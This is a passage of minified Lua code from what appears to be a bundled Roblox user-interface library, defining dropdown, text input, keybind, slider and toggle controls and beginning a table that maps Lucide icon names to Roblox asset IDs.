table.insert(C,D)end return C else return l.Value and 1 or 0 end end function l.BuildDropdownList(B)local C,D=l.Values,{}for E,F in next,t:GetChildren()do if not F:IsA'UIListLayout'then F:Destroy()end end local G=0 for H,I in next,C do local J={}G=G+1 local K,L=d('Frame',{Size=UDim2.fromOffset(4,14),BackgroundColor3=Color3.fromRGB(76,194,255),Position=UDim2.fromOffset(-1,16),AnchorPoint=Vector2.new(0,0.5),ThemeTag={BackgroundColor3='Accent'}},{d('UICorner',{CornerRadius=UDim.new(0,2)})}),d('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',Text=I,TextColor3=Color3.fromRGB(200,200,200),TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,BackgroundColor3=Color3.fromRGB(255,255,255),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Position=UDim2.fromOffset(10,0),Name='ButtonLabel',ThemeTag={TextColor3='Text'}})local M,N=(d('TextButton',{Size=UDim2.new(1,-5,0,32),BackgroundTransparency=1,ZIndex=23,Text='',Parent=t,ThemeTag={BackgroundColor3='DropdownOption'}},{K,L,d('UICorner',{CornerRadius=UDim.new(0,6)})}))if j.Multi then N=l.Value[I]else N=l.Value==I end local O,P=b.SpringMotor(1,M,'BackgroundTransparency')local Q,R=b.SpringMotor(1,K,'BackgroundTransparency')local S=c.SingleMotor.new(6)S:onStep(function(T)K.Size=UDim2.new(0,4,0,T)end)b.AddSignal(M.MouseEnter,function()P(N and 0.85 or 0.89)end)b.AddSignal(M.MouseLeave,function()P(N and 0.89 or 1)end)b.AddSignal(M.MouseButton1Down,function()P(0.92)end)b.AddSignal(M.MouseButton1Up,function()P(N and 0.85 or 0.89)end)function J.UpdateButton(T)if j.Multi then N=l.Value[I]if N then P(0.89)end else N=l.Value==I P(N and 0.89 or 1)end S:setGoal(c.Spring.new(N and 14 or 6,{frequency=6}))R(N and 0 or 1)end L.InputBegan:Connect(function(T)if T.UserInputType==Enum.UserInputType.MouseButton1 or T.UserInputType==Enum.UserInputType.Touch then local U=not N if l:GetActiveValues()==1 and not U and not j.AllowNull then else if j.Multi then N=U l.Value[I]=N and true or nil else N=U l.Value=N and I or nil for V,W in next,D do W:UpdateButton()end end J:UpdateButton()l:Display()k:SafeCallback(l.Callback,l.Value)k:SafeCallback(l.Changed,l.Value)end end end)J:UpdateButton()l:Display()D[M]=J end x=0 for J,K in next,D do if J.ButtonLabel then if J.ButtonLabel.TextBounds.X>x then x=J.ButtonLabel.TextBounds.X end end end x=x+30 z()y()end function l.SetValues(B,C)if C then l.Values=C end l:BuildDropdownList()end function l.OnChanged(B,C)l.Changed=C C(l.Value)end function l.SetValue(B,C)if l.Multi then local D={}for E,F in next,C do if table.find(l.Values,E)then D[E]=true end end l.Value=D else if not C then l.Value=nil elseif table.find(l.Values,C)then l.Value=C end end l:BuildDropdownList()k:SafeCallback(l.Callback,l.Value)k:SafeCallback(l.Changed,l.Value)end function l.Destroy(B)m:Destroy()k.Options[i]=nil end l:BuildDropdownList()l:Display()local B={}if type(j.Default)=='string'then local C=table.find(l.Values,j.Default)if C then table.insert(B,C)end elseif type(j.Default)=='table'then for C,D in next,j.Default do local E=table.find(l.Values,D)if E then table.insert(B,E)end end elseif type(j.Default)=='number'and l.Values[j.Default]~=nil then table.insert(B,j.Default)end if next(B)then for C=1,#B do local D=B[C]if j.Multi then l.Value[l.Values[D]]=true else l.Value=l.Values[D]end if not j.Multi then break end end l:BuildDropdownList()l:Display()end k.Options[i]=l return l end return g end)()end,[23]=function()local aa,ab,ac=a(23)local ad return(function(...)local ae=ab.Parent.Parent local af=ac(ae.Creator)local ag,ah,ai,b=af.New,af.AddSignal,ae.Components,{}b.__index=b b.__type='Input'function b.New(c,d,e)local g=c.Library assert(e.Title,'Input - Missing Title')e.Callback=e.Callback or function()end local h,i={Value=e.Default or'',Numeric=e.Numeric or false,Finished=e.Finished or false,Callback=e.Callback or function(h)end,Type='Input'},ac(ai.Element)(e.Title,e.Description,c.Container,false)h.SetTitle=i.SetTitle h.SetDesc=i.SetDesc local j=ac(ai.Textbox)(i.Frame,true)j.Frame.Position=UDim2.new(1,-10,0.5,0)j.Frame.AnchorPoint=Vector2.new(1,0.5)j.Frame.Size=UDim2.fromOffset(160,30)j.Input.Text=e.Default or''j.Input.PlaceholderText=e.Placeholder or''local k=j.Input function h.SetValue(l,m)if e.MaxLength and#m>e.MaxLength then m=m:sub(1,e.MaxLength)end if h.Numeric then if(not tonumber(m))and m:len()>0 then m=h.Value end end h.Value=m k.Text=m g:SafeCallback(h.Callback,h.Value)g:SafeCallback(h.Changed,h.Value)end if h.Finished then ah(k.FocusLost,function(l)if not l then return end h:SetValue(k.Text)end)else ah(k:GetPropertyChangedSignal'Text',function()h:SetValue(k.Text)end)end function h.OnChanged(l,m)h.Changed=m m(h.Value)end function h.Destroy(l)i:Destroy()g.Options[d]=nil end g.Options[d]=h return h end return b end)()end,[24]=function()local aa,ab,ac=a(24)local ad return(function(...)local ae,af=game:GetService'UserInputService',ab.Parent.Parent local ag=ac(af.Creator)local ah,ai,b=ag.New,af.Components,{}b.__index=b b.__type='Keybind'function b.New(c,d,e)local g=c.Library assert(e.Title,'KeyBind - Missing Title')assert(e.Default,'KeyBind - Missing default value.')local h,i,j={Value=e.Default,Toggled=false,Mode=e.Mode or'Toggle',Type='Keybind',Callback=e.Callback or function(h)end,ChangedCallback=e.ChangedCallback or function(h)end},false,ac(ai.Element)(e.Title,e.Description,c.Container,true)h.SetTitle=j.SetTitle h.SetDesc=j.SetDesc local k=ah('TextLabel',{FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Regular,Enum.FontStyle.Normal),Text=e.Default,TextColor3=Color3.fromRGB(240,240,240),TextSize=13,TextXAlignment=Enum.TextXAlignment.Center,Size=UDim2.new(0,0,0,14),Position=UDim2.new(0,0,0.5,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=Color3.fromRGB(255,255,255),AutomaticSize=Enum.AutomaticSize.X,BackgroundTransparency=1,ThemeTag={TextColor3='Text'}})local l=ah('TextButton',{Size=UDim2.fromOffset(0,30),Position=UDim2.new(1,-10,0.5,0),AnchorPoint=Vector2.new(1,0.5),BackgroundTransparency=0.9,Parent=j.Frame,AutomaticSize=Enum.AutomaticSize.X,ThemeTag={BackgroundColor3='Keybind'}},{ah('UICorner',{CornerRadius=UDim.new(0,5)}),ah('UIPadding',{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)}),ah('UIStroke',{Transparency=0.5,ApplyStrokeMode=Enum.ApplyStrokeMode.Border,ThemeTag={Color='InElementBorder'}}),k})function h.GetState(m)if ae:GetFocusedTextBox()and h.Mode~='Always'then return false end if h.Mode=='Always'then return true elseif h.Mode=='Hold'then if h.Value=='None'then return false end local n=h.Value if n=='MouseLeft'or n=='MouseRight'then return n=='MouseLeft'and ae:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)or n=='MouseRight'and ae:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)else return ae:IsKeyDown(Enum.KeyCode[h.Value])end else return h.Toggled end end function h.SetValue(m,n,o)n=n or h.Key o=o or h.Mode k.Text=n h.Value=n h.Mode=o end function h.OnClick(m,n)h.Clicked=n end function h.OnChanged(m,n)h.Changed=n n(h.Value)end function h.DoClick(m)g:SafeCallback(h.Callback,h.Toggled)g:SafeCallback(h.Clicked,h.Toggled)end function h.Destroy(m)j:Destroy()g.Options[d]=nil end ag.AddSignal(l.InputBegan,function(m)if m.UserInputType==Enum.UserInputType.MouseButton1 or m.UserInputType==Enum.UserInputType.Touch then i=true k.Text='...'wait(0.2)local n n=ae.InputBegan:Connect(function(o)local r if o.UserInputType==Enum.UserInputType.Keyboard then r=o.KeyCode.Name elseif o.UserInputType==Enum.UserInputType.MouseButton1 then r='MouseLeft'elseif o.UserInputType==Enum.UserInputType.MouseButton2 then r='MouseRight'end local s s=ae.InputEnded:Connect(function(t)if t.KeyCode.Name==r or r=='MouseLeft'and t.UserInputType==Enum.UserInputType.MouseButton1 or r=='MouseRight'and t.UserInputType==Enum.UserInputType.MouseButton2 then i=false k.Text=r h.Value=r g:SafeCallback(h.ChangedCallback,t.KeyCode or t.UserInputType)g:SafeCallback(h.Changed,t.KeyCode or t.UserInputType)n:Disconnect()s:Disconnect()end end)end)end end)ag.AddSignal(ae.InputBegan,function(m)if not i and not ae:GetFocusedTextBox()then if h.Mode=='Toggle'then local n=h.Value if n=='MouseLeft'or n=='MouseRight'then if n=='MouseLeft'and m.UserInputType==Enum.UserInputType.MouseButton1 or n=='MouseRight'and m.UserInputType==Enum.UserInputType.MouseButton2 then h.Toggled=not h.Toggled h:DoClick()end elseif m.UserInputType==Enum.UserInputType.Keyboard then if m.KeyCode.Name==n then h.Toggled=not h.Toggled h:DoClick()end end end end end)g.Options[d]=h return h end return b end)()end,[25]=function()local aa,ab,ac=a(25)local ad return(function(...)local ae=ab.Parent.Parent local af,ag,ah,ai=ae.Components,ac(ae.Packages.Flipper),ac(ae.Creator),{}ai.__index=ai ai.__type='Paragraph'function ai.New(b,c)assert(c.Title,'Paragraph - Missing Title')c.Content=c.Content or''local d=ac(af.Element)(c.Title,c.Content,ai.Container,false)d.Frame.BackgroundTransparency=0.92 d.Border.Transparency=0.6 return d end return ai end)()end,[26]=function()local aa,ab,ac=a(26)local ad return(function(...)local ae,af=game:GetService'UserInputService',ab.Parent.Parent local ag=ac(af.Creator)local ah,ai,b=ag.New,af.Components,{}b.__index=b b.__type='Slider'function b.New(c,d,e)local g=c.Library assert(e.Title,'Slider - Missing Title.')assert(e.Default,'Slider - Missing default value.')assert(e.Min,'Slider - Missing minimum value.')assert(e.Max,'Slider - Missing maximum value.')assert(e.Rounding,'Slider - Missing rounding value.')local h,i,j={Value=nil,Min=e.Min,Max=e.Max,Rounding=e.Rounding,Callback=e.Callback or function(h)end,Type='Slider'},false,ac(ai.Element)(e.Title,e.Description,c.Container,false)j.DescLabel.Size=UDim2.new(1,-170,0,14)h.SetTitle=j.SetTitle h.SetDesc=j.SetDesc local k=ah('ImageLabel',{AnchorPoint=Vector2.new(0,0.5),Position=UDim2.new(0,-7,0.5,0),Size=UDim2.fromOffset(14,14),Image='http://www.roblox.com/asset/?id=12266946128',ThemeTag={ImageColor3='Accent'}})local l,m,n=ah('Frame',{BackgroundTransparency=1,Position=UDim2.fromOffset(7,0),Size=UDim2.new(1,-14,1,0)},{k}),ah('Frame',{Size=UDim2.new(0,0,1,0),ThemeTag={BackgroundColor3='Accent'}},{ah('UICorner',{CornerRadius=UDim.new(1,0)})}),ah('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',Text='Value',TextSize=12,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Right,BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,Size=UDim2.new(0,100,0,14),Position=UDim2.new(0,-4,0.5,0),AnchorPoint=Vector2.new(1,0.5),ThemeTag={TextColor3='SubText'}})local o=ah('Frame',{Size=UDim2.new(1,0,0,4),AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-10,0.5,0),BackgroundTransparency=0.4,Parent=j.Frame,ThemeTag={BackgroundColor3='SliderRail'}},{ah('UICorner',{CornerRadius=UDim.new(1,0)}),ah('UISizeConstraint',{MaxSize=Vector2.new(150,math.huge)}),n,m,l})ag.AddSignal(k.InputBegan,function(r)if r.UserInputType==Enum.UserInputType.MouseButton1 or r.UserInputType==Enum.UserInputType.Touch then i=true end end)ag.AddSignal(k.InputEnded,function(r)if r.UserInputType==Enum.UserInputType.MouseButton1 or r.UserInputType==Enum.UserInputType.Touch then i=false end end)ag.AddSignal(ae.InputChanged,function(r)if i and(r.UserInputType==Enum.UserInputType.MouseMovement or r.UserInputType==Enum.UserInputType.Touch)then local s=math.clamp((r.Position.X-l.AbsolutePosition.X)/l.AbsoluteSize.X,0,1)h:SetValue(h.Min+((h.Max-h.Min)*s))end end)function h.OnChanged(r,s)h.Changed=s s(h.Value)end function h.SetValue(r,s)r.Value=g:Round(math.clamp(s,h.Min,h.Max),h.Rounding)k.Position=UDim2.new((r.Value-h.Min)/(h.Max-h.Min),-7,0.5,0)m.Size=UDim2.fromScale((r.Value-h.Min)/(h.Max-h.Min),1)n.Text=tostring(r.Value)g:SafeCallback(h.Callback,r.Value)g:SafeCallback(h.Changed,r.Value)end function h.Destroy(r)j:Destroy()g.Options[d]=nil end h:SetValue(e.Default)g.Options[d]=h return h end return b end)()end,[27]=function()local aa,ab,ac=a(27)local ad return(function(...)local ae,af=game:GetService'TweenService',ab.Parent.Parent local ag=ac(af.Creator)local ah,ai,b=ag.New,af.Components,{}b.__index=b b.__type='Toggle'function b.New(c,d,e)local g=c.Library assert(e.Title,'Toggle - Missing Title')local h,i={Value=e.Default or false,Callback=e.Callback or function(h)end,Type='Toggle'},ac(ai.Element)(e.Title,e.Description,c.Container,true)i.DescLabel.Size=UDim2.new(1,-54,0,14)h.SetTitle=i.SetTitle h.SetDesc=i.SetDesc local j,k=ah('ImageLabel',{AnchorPoint=Vector2.new(0,0.5),Size=UDim2.fromOffset(14,14),Position=UDim2.new(0,2,0.5,0),Image='http://www.roblox.com/asset/?id=12266946128',ImageTransparency=0.5,ThemeTag={ImageColor3='ToggleSlider'}}),ah('UIStroke',{Transparency=0.5,ThemeTag={Color='ToggleSlider'}})local l=ah('Frame',{Size=UDim2.fromOffset(36,18),AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-10,0.5,0),Parent=i.Frame,BackgroundTransparency=1,ThemeTag={BackgroundColor3='Accent'}},{ah('UICorner',{CornerRadius=UDim.new(0,9)}),k,j})function h.OnChanged(m,n)h.Changed=n n(h.Value)end function h.SetValue(m,n)n=not not n h.Value=n ag.OverrideTag(k,{Color=h.Value and'Accent'or'ToggleSlider'})ag.OverrideTag(j,{ImageColor3=h.Value and'ToggleToggled'or'ToggleSlider'})ae:Create(j,TweenInfo.new(0.25,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{Position=UDim2.new(0,h.Value and 19 or 2,0.5,0)}):Play()ae:Create(l,TweenInfo.new(0.25,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{BackgroundTransparency=h.Value and 0 or 1}):Play()j.ImageTransparency=h.Value and 0 or 0.5 g:SafeCallback(h.Callback,h.Value)g:SafeCallback(h.Changed,h.Value)end function h.Destroy(m)i:Destroy()g.Options[d]=nil end ag.AddSignal(i.Frame.MouseButton1Click,function()h:SetValue(not h.Value)end)h:SetValue(h.Value)g.Options[d]=h return h end return b end)()end,[28]=function()local aa,ab,ac=a(28)local ad return(function(...)return{assets={['lucide-accessibility']='rbxassetid://10709751939',['lucide-activity']='rbxassetid://10709752035',['lucide-air-vent']='rbxassetid://10709752131',['lucide-airplay']='rbxassetid://10709752254',['lucide-alarm-check']='rbxassetid://10709752405',['lucide-alarm-clock']='rbxassetid://10709752630',['lucide-alarm-clock-off']='rbxassetid://10709752508',['lucide-alarm-minus']='rbxassetid://10709752732',['lucide-alarm-plus']='rbxassetid://10709752825',['lucide-album']='rbxassetid://10709752906',['lucide-alert-circle']='rbxassetid://10709752996',['lucide-alert-octagon']='rbxassetid://10709753064',['lucide-alert-triangle']='rbxassetid://10709753149',['lucide-align-center']='rbxassetid://10709753570',['lucide-align-center-horizontal']='rbxassetid://10709753272',['lucide-align-center-vertical']='rbxassetid://10709753421',['lucide-align-end-horizontal']='rbxassetid://10709753692',['lucide-align-end-vertical']='rbxassetid://10709753808',['lucide-align-horizontal-distribute-center']='rbxassetid://10747779791',['lucide-align-horizontal-distribute-end']='rbxassetid://10747784534',['lucide-align-horizontal-distribute-start']='rbxassetid://10709754118',['lucide-align-horizontal-justify-center']='rbxassetid://10709754204',['lucide-align-horizontal-justify-end']='rbxassetid://10709754317',['lucide-align-horizontal-justify-start']='rbxassetid://10709754436',['lucide-align-horizontal-space-around']='rbxassetid://10709754590',['lucide-align-horizontal-space-between']='rbxassetid://10709754749',['lucide-align-justify']='rbxassetid://10709759610',['lucide-align-left']='rbxassetid://10709759764',['lucide-align-right']='rbxassetid://10709759895',['lucide-align-start-horizontal']='rbxassetid://10709760051',['lucide-align-start-vertical']='rbxassetid://10709760244',['lucide-align-vertical-distribute-center']='rbxassetid://10709760351',['lucide-align-vertical-distribute-end']='rbxassetid://10709760434',['lucide-align-vertical-distribute-start']='rbxassetid://10709760612',['lucide-align-vertical-justify-center']='rbxassetid://10709760814',['lucide-align-vertical-justify-end']='rbxassetid://10709761003',['lucide-align-vertical-justify-start']='rbxassetid://10709761176',['lucide-align-vertical-space-around']='rbxassetid://10709761324',['lucide-align-vertical-space-between']='rbxassetid://10709761434',['lucide-anchor']='rbxassetid://10709761530',['lucide-angry']='rbxassetid://10709761629',['lucide-annoyed']='rbxassetid://10709761722',['lucide-aperture']='rbxassetid://10709761813',['lucide-apple']='rbxassetid://10709761889',['lucide-archive']='rbxassetid://10709762233',['lucide-archive-restore']='rbxassetid://10709762058',['lucide-armchair']='rbxassetid://10709762327',['lucide-arrow-big-down']='rbxassetid://10747796644',['lucide-arrow-big-left']='rbxassetid://10709762574',['lucide-arrow-big-right']='rbxassetid://10709762727',['lucide-arrow-big-up']='rbxassetid://10709762879',['lucide-arrow-down']='rbxassetid://10709767827',['lucide-arrow-down-circle']='rbxassetid://10709763034',['lucide-arrow-down-left']='rbxassetid://10709767656',['lucide-arrow-down-right']='rbxassetid://10709767750',['lucide-arrow-left']='rbxassetid://10709768114',['lucide-arrow-left-circle']='rbxassetid://10709767936',['lucide-arrow-left-right']='rbxassetid://10709768019',['lucide-arrow-right']='rbxassetid://10709768347',['lucide-arrow-right-circle']='rbxassetid://10709768226',['lucide-arrow-up']='rbxassetid://10709768939',['lucide-arrow-up-circle']='rbxassetid://10709768432',['lucide-arrow-up-down']='rbxassetid://10709768538',['lucide-arrow-up-left']='rbxassetid://10709768661',['lucide-arrow-up-right']='rbxassetid://10709768787',['lucide-asterisk']='rbxassetid://10709769095',['lucide-at-sign']='rbxassetid://10709769286',['lucide-award']='rbxassetid://10709769406',['lucide-axe']='rbxassetid://10709769508',['lucide-axis-3d']='rbxassetid://10709769598',['lucide-baby']='rbxassetid://10709769732',['lucide-backpack']='rbxassetid://10709769841',['lucide-baggage-claim']='rbxassetid://10709769935',['lucide-banana']='rbxassetid://10709770005',['lucide-banknote']='rbxassetid://10709770178',['lucide-bar-chart']='rbxassetid://10709773755',['lucide-bar-chart-2']='rbxassetid://10709770317',['lucide-bar-chart-3']='rbxassetid://10709770431',['lucide-bar-chart-4']='rbxassetid://10709770560',['lucide-bar-chart-horizontal']='rbxassetid://10709773669',['lucide-barcode']='rbxassetid://10747360675',['lucide-baseline']='rbxassetid://10709773863',['lucide-bath']='rbxassetid://10709773963',['lucide-battery']='rbxassetid://10709774640',['lucide-battery-charging']='rbxassetid://10709774068',['lucide-battery-full']='rbxassetid://10709774206',['lucide-battery-low']='rbxassetid://10709774370',['lucide-battery-medium']='rbxassetid://10709774513',['lucide-beaker']='rbxassetid://10709774756',['lucide-bed']='rbxassetid://10709775036',['lucide-bed-double']='rbxassetid://10709774864',['lucide-bed-single']='rbxassetid://10709774968',['lucide-beer']='rbxassetid://10709775167',['lucide-bell']='rbxassetid://10709775704',['lucide-bell-minus']='rbxassetid://10709775241',['lucide-bell-off']='rbxassetid://10709775320',['lucide-bell-plus']='rbxassetid://10709775448',['lucide-bell-ring']='rbxassetid://10709775560',['lucide-bike']='rbxassetid://10709775894',['lucide-binary']='rbxassetid://10709776050',['lucide-bitcoin']='rbxassetid://10709776126',['lucide-bluetooth']='rbxassetid://10709776655',['lucide-bluetooth-connected']='rbxassetid://10709776240',['lucide-bluetooth-off']='rbxassetid://10709776344',['lucide-bluetooth-searching']='rbxassetid://10709776501',['lucide-bold']='rbxassetid://10747813908',['lucide-bomb']='rbxassetid://10709781460',['lucide-bone']='rbxassetid://10709781605',['lucide-book']='rbxassetid://10709781824',['lucide-book-open']='rbxassetid://10709781717',['lucide-bookmark']='rbxassetid://10709782154',['lucide-bookmark-minus']='rbxassetid://10709781919',['lucide-bookmark-plus']='rbxassetid://10709782044',['lucide-bot']='rbxassetid://10709782230',['lucide-box']='rbxassetid://10709782497',['lucide-box-select']='rbxassetid://10709782342',['lucide-boxes']='rbxassetid://10709782582',['lucide-briefcase']='rbxassetid://10709782662',['lucide-brush']='rbxassetid://10709782758',['lucide-bug']='rbxassetid://10709782845',['lucide-building']='rbxassetid://10709783051',['lucide-building-2']='rbxassetid://10709782939',['lucide-bus']='rbxassetid://10709783137',['lucide-cake']='rbxassetid://10709783217',['lucide-calculator']='rbxassetid://10709783311',['lucide-calendar']='rbxassetid://10709789505',['lucide-calendar-check']='rbxassetid://10709783474',['lucide-calendar-check-2']='rbxassetid://10709783392',['lucide-calendar-clock']='rbxassetid://10709783577',['lucide-calendar-days']='rbxassetid://10709783673',['lucide-calendar-heart']='rbxassetid://10709783835',['lucide-calendar-minus']='rbxassetid://10709783959',['lucide-calendar-off']='rbxassetid://10709788784',['lucide-calendar-plus']='rbxassetid://10709788937',['lucide-calendar-range']='rbxassetid://10709789053',['lucide-calendar-search']='rbxassetid://10709789200',['lucide-calendar-x']='rbxassetid://10709789407',['lucide-calendar-x-2']='rbxassetid://10709789329',['lucide-camera']='rbxassetid://10709789686',['lucide-camera-off']='rbxassetid://10747822677',['lucide-car']='rbxassetid://10709789810',['lucide-carrot']='rbxassetid://10709789960',['lucide-cast']='rbxassetid://10709790097',['lucide-charge']='rbxassetid://10709790202',['lucide-check']='rbxassetid://10709790644',['lucide-check-circle']='rbxassetid://10709790387',['lucide-check-circle-2']='rbxassetid://10709790298',['lucide-check-square']='rbxassetid://10709790537',['lucide-chef-hat']='rbxassetid://10709790757',['lucide-cherry']='rbxassetid://10709790875',['lucide-chevron-down']='rbxassetid://10709790948',['lucide-chevron-first']='rbxassetid://10709791015',['lucide-chevron-last']='rbxassetid://10709791130',['lucide-chevron-left']='rbxassetid://10709791281',['lucide-chevron-right']='rbxassetid://10709791437',['lucide-chevron-up']='rbxassetid://10709791523',['lucide-chevrons-down']='rbxassetid://10709796864',['lucide-chevrons-down-up']='rbxassetid://10709791632',['lucide-chevrons-left']='rbxassetid://10709797151',['lucide-chevrons-left-right']='rbxassetid://10709797006',['lucide-chevrons-right']='rbxassetid://10709797382',['lucide-chevrons-right-left']='rbxassetid://10709797274',['lucide-chevrons-up']='rbxassetid://10709797622',['lucide-chevrons-up-down']='rbxassetid://10709797508',['lucide-chrome']='rbxassetid://10709797725',['lucide-circle']='rbxassetid://10709798174',['lucide-circle-dot']='rbxassetid://10709797837',['lucide-circle-ellipsis']='rbxassetid://10709797985',['lucide-circle-slashed']='rbxassetid://10709798100',['lucide-citrus']='rbxassetid://10709798276',['lucide-clapperboard']='rbxassetid://10709798350',['lucide-clipboard']='rbxassetid://10709799288',['lucide-clipboard-check']='rbxassetid://10709798443',['lucide-clipboard-copy']='rbxassetid://10709798574',['lucide-clipboard-edit']='rbxassetid://10709798682',['lucide-clipboard-list']='rbxassetid://10709798792',['lucide-clipboard-signature']='rbxassetid://10709798890',['lucide-clipboard-type']='rbxassetid://10709798999',['lucide-clipboard-x']='rbxassetid://10709799124',['lucide-clock']='rbxassetid://10709805144',['lucide-clock-1']='rbxassetid://10709799535',['lucide-clock-10']='rbxassetid://10709799718',['lucide-clock-11']='rbxassetid://10709799818',['lucide-clock-12']='rbxassetid://10709799962',['lucide-clock-2']='rbxassetid://10709803876',['lucide-clock-3']='rbxassetid://10709803989',['lucide-clock-4']='rbxassetid://10709804164',['lucide-clock-5']='rbxassetid://10709804291',['lucide-clock-6']='rbxassetid://10709804435',['lucide-clock-7']='rbxassetid://10709804599',['lucide-clock-8']='rbxassetid://10709804784',['lucide-clock-9']='rbxassetid://10709804996',['lucide-cloud']='rbxassetid://10709806740',['lucide-cloud-cog']='rbxassetid://10709805262',['lucide-cloud-drizzle']='rbxassetid://10709805371',['lucide-cloud-fog']='rbxassetid://10709805477',['lucide-cloud-hail']='rbxassetid://10709805596',['lucide-cloud-lightning']='rbxassetid://10709805727',['lucide-cloud-moon']='rbxassetid://10709805942',['lucide-cloud-moon-rain']='rbxassetid://10709805838',['lucide-cloud-off']='rbxassetid://10709806060',['lucide-cloud-rain']='rbxassetid://10709806277',['lucide-cloud-rain-wind']='rbxassetid://10709806166',['lucide-cloud-snow']='rbxassetid://10709806374',['lucide-cloud-sun']='rbxassetid://10709806631',['lucide-cloud-sun-rain']='rbxassetid://10709806475',['lucide-cloudy']='rbxassetid://10709806859',['lucide-clover']='rbxassetid://10709806995',['lucide-code']='rbxassetid://10709810463',['lucide-code-2']='rbxassetid://10709807111',['lucide-codepen']='rbxassetid://10709810534',['lucide-codesandbox']='rbxassetid://10709810676',['lucide-coffee']='rbxassetid://10709810814',['lucide-cog']='rbxassetid://10709810948',['lucide-coins']='rbxassetid://10709811110',['lucide-columns']='rbxassetid://10709811261',['lucide-command']='rbxassetid://10709811365',['lucide-compass']='rbxassetid://10709811445',['lucide-component']='rbxassetid://10709811595',['lucide-concierge-bell']='rbxassetid://10709811706',['lucide-connection']='rbxassetid://10747361219',['lucide-contact']='rbxassetid://10709811834',['lucide-contrast']='rbxassetid://10709811939',['lucide-cookie']='rbxassetid://10709812067',['lucide-copy']='rbxassetid://10709812159',['lucide-copyleft']='rbxassetid://10709812251',['lucide-copyright']='rbxassetid://10709812311',['lucide-corner-down-left']='rbxassetid://10709812396',['lucide-corner-down-right']='rbxassetid://10709812485',['lucide-corner-left-down']='rbxassetid://10709812632',['lucide-corner-left-up']='rbxassetid://10709812784',['lucide-corner-right-down']='rbxassetid://10709812939',['lucide-corner-right-up']='rbxassetid://10709813094',['lucide-corner-up-left']='rbxassetid://10709813185',['lucide-corner-up-right']='rbxassetid://10709813281',['lucide-cpu']='rbxassetid://10709813383',['lucide-croissant']='rbxassetid://10709818125',['lucide-crop']='rbxassetid://10709818245',['lucide-cross']='rbxassetid://10709818399',['lucide-crosshair']='rbxassetid://10709818534',['lucide-crown']='rbxassetid://10709818626',['lucide-cup-soda']='rbxassetid://10709818763',['lucide-curly-braces']='rbxassetid://10709818847',['lucide-currency']='rbxassetid://10709818931',['lucide-database']='rbxassetid://10709818996',['lucide-delete']='rbxassetid://10709819059',['lucide-diamond']='rbxassetid://10709819149',['lucide-dice-1']='rbxassetid://10709819266',['lucide-dice-2']='rbxassetid://10709819361',['lucide-dice-3']='rbxassetid://10709819508',['lucide-dice-4']='rbxassetid://10709819670',['lucide-dice-5']='rbxassetid://10709819801',['lucide-dice-6']='rbxassetid://10709819896',['lucide-dices']='rbxassetid://10723343321',['lucide-diff']='rbxassetid://10723343416',['lucide-disc']='rbxassetid://10723343537',['lucide-divide']='rbxassetid://10723343805',['lucide-divide-circle']='rbxassetid://10723343636',['lucide-divide-square']='rbxassetid://10723343737',['lucide-dollar-sign']='rbxassetid://10723343958',['lucide-download']='rbxassetid://10723344270',['lucide-download-cloud']='rbxassetid://10723344088',['lucide-droplet']='rbxassetid://10723344432',['lucide-droplets']='rbxassetid://10734883356',['lucide-drumstick']='rbxassetid://10723344737',['lucide-edit']='rbxassetid://10734883598',['lucide-edit-2']='rbxassetid://10723344885',['lucide-edit-3']='rbxassetid://10723345088',['lucide-egg']='rbxassetid://10723345518',['lucide-egg-fried']='rbxassetid://10723345347',['lucide-electricity']='rbxassetid://10723345749',['lucide-electricity-off']='rbxassetid://10723345643',['lucide-equal']='rbxassetid://10723345990',['lucide-equal-not']='rbxassetid://10723345866',['lucide-eraser']='rbxassetid://10723346158',['lucide-euro']='rbxassetid://10723346372',['lucide-expand']='rbxassetid://10723346553',['lucide-external-link']='rbxassetid://10723346684',['lucide-eye']='rbxassetid://10723346959',['lucide-eye-off']='rbxassetid://10723346871',['lucide-factory']='rbxassetid://10723347051',['lucide-fan']='rbxassetid://10723354359',['lucide-fast-forward']='rbxassetid://10723354521',['lucide-feather']='rbxassetid://10723354671',['lucide-figma']='rbxassetid://10723354801',['lucide-file']='rbxassetid://10723374641',['lucide-file-archive']='rbxassetid://10723354921',['lucide-file-audio']='rbxassetid://10723355148',['lucide-file-audio-2']='rbxassetid://10723355026',['lucide-file-axis-3d']='rbxassetid://10723355272',['lucide-file-badge']='rbxassetid://10723355622',['lucide-file-badge-2']='rbxassetid://10723355451',['lucide-file-bar-chart']='rbxassetid://10723355887',['lucide-file-bar-chart-2']='rbxassetid://10723355746',['lucide-file-box']='rbxassetid://10723355989',['lucide-file-check']='rbxassetid://10723356210',['lucide-file-check-2']='rbxassetid://10723356100',['lucide-file-clock']='rbxassetid://10723356329',['lucide-file-code']='rbxassetid://10723356507',['lucide-file-cog']='rbxassetid://10723356830',['lucide-file-cog-2']='rbxassetid://10723356676',['lucide-file-diff']='rbxassetid://10723357039',['lucide-file-digit']='rbxassetid://10723357151',['lucide-file-down']='rbxassetid://10723357322',['lucide-file-edit']='rbxassetid://10723357495',['lucide-file-heart']='rbxassetid://10723357637',['lucide-file-image']='rbxassetid://10723357790',['lucide-file-input']='rbxassetid://10723357933',['lucide-file-json']='rbxassetid://10723364435',['lucide-file-json-2']='rbxassetid://10723364361',['lucide-file-key']='rbxassetid://10723364605',['lucide-file-key-2']='rbxassetid://10723364515',['lucide-file-line-chart']='rbxassetid://10723364725',['lucide-file-lock']='rbxassetid://10723364957',['lucide-file-lock-2']='rbxassetid://10723364861',['lucide-file-minus']='rbxassetid://10723365254',['lucide-file-minus-2']='rbxassetid://10723365086',['lucide-file-output']='rbxassetid://10723365457',['lucide-file-pie-chart']='rbxassetid://10723365598',['lucide-file-plus']='rbxassetid://10723365877'